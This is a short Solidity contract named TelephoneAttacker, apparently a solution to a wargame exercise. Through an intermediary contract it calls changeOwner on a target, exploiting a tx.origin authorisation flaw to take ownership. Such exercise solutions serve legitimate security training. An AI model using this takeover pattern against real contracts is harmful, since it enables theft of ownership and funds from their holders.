// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { ITelephone } from "./ITelephone.sol";

contract TelephoneAttacker is Ownable2Step {
    function exploit(ITelephone _telephone) external onlyOwner {
        _telephone.changeOwner(msg.sender);
    }
}
